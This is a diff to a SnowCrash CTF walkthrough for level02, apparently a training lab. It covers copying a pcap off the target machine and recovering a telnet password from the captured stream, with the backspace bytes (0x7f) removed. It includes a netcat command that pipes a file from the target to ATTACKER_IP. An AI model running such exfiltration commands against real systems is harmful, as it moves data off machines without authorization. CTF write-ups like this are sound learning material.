@@ -8,22 +8,25 @@
 
 Retrieve the [level02.pcap](https://github.com/Pixailz/SnowCrash/tree/main/level02/resources/level02.pcap) file
 
-> on the attacker machine
+> on the ATTACKER machine
 ```bash
 nc -lvp 4444 > level02.pcap
 ```
 
-> on the snowcrash machine
+> on the TARGET machine
 ```bash
 cat level02.pcap | nc ATTACKER_IP 4444
 ```
 
 ## STEP 02
 
-Opening the **level02.pcap** file with Wireshark show us a TCP stream from a
-TELNET session, i believe
+Opening the **[level02.pcap](https://github.com/Pixailz/SnowCrash/blob/main/level02/resources/level02.pcap)**
+file with Wireshark show us a TCP stream from a TELNET session, i believe
 
-Here is the followed stream output
+> [!TIP]
+> To follow the whole stream, simply click on a packet -> Follow -> TCP Stream
+
+Here is the output
 ```
 ..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
 ..............................1.......!.."......"......!..........."........"..".............	..
@@ -46,9 +49,8 @@ A little bit of guessing
 It seems that we need to go deeper with the **Password: ft_wandr...NDRel.L0L**
 part
 
-> [!TIP]
-> '.' represent 0x7f and it's not printable, that's why it's represented with
-> '.'
+> [!NOTE]
+> because it's not printable, '.' represent 0x7f, it's available under C Array
 
 So guessing that those 0x7f is a **backspace**, deleting and reformating give us
 the following password
